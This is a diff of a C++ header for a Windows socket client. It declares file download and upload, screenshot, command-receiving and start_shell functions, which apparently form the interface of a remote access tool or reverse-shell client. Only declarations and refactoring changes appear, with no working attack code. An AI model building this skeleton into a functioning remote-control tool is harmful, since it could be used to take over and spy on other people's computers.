@@ -2,15 +2,18 @@
 #define CLIENT_HPP
 
 #include <WinSock2.h>
+#include <unordered_map>
 #include <WS2tcpip.h>
-#include <stdio.h>
-#include <stdlib.h>   // Needed for _wtoi
+#include <iostream>
+#include <string>
+#include <cstdio>
+#include <cstdlib>   // Needed for _wtoi
+#define BUFFER_SIZE (2048)
 
-#define BUFFER_SIZE (1024)
-
-class Commands {
-public:
+struct Commands
+{
     void print_help();
+    void clear_screen();
     void download(char* filefrom, char* fileto);
     void upload(char* filefrom, char* fileto);
     void screenshot(char* outpath);
@@ -20,24 +23,20 @@ public:
 };
 
 
-class Client : Commands {
+class Client : Commands 
+{
 public:
     Client(const char* chost, unsigned short int cport);
-    void connect_socket();
+    void create_socket();
+    bool connect_socket();
     bool check_connection();
-    void receive_commands();
+    int receive_commands();
     int start_shell();
-
-    void cleanup() {
-        closesocket(socket);
-        WSACleanup();
-    }
 
 private:
     WSADATA wsaData;
     struct sockaddr_in addr;
     SOCKET socket;
-
     char rdata[BUFFER_SIZE];
     const char* server;
     unsigned short int port;
